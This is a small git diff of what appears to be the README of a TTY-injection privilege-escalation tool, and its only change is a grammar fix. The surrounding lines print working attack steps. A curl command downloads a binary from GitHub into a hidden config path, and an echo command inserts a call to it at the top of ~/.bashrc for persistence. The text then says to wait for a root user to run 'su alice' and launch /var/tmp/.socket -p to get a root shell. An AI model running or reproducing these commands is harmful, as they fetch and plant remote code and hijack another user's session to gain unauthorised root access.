@@ -15,7 +15,7 @@ curl -o ~/.config/procps/reset -fsSL "https://github.com/hackerschoice/ttyinject
 echo "$(head -n1 ~/.bashrc)"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 ~/.bashrc)" >~/.bashrc; fi
 ```
 
-Wait for ROOT to execute 'su alice' and thereafter gain a root with:
+Wait for ROOT to execute 'su alice' and thereafter gain root with:
 ```
 /var/tmp/.socket -p
 ```
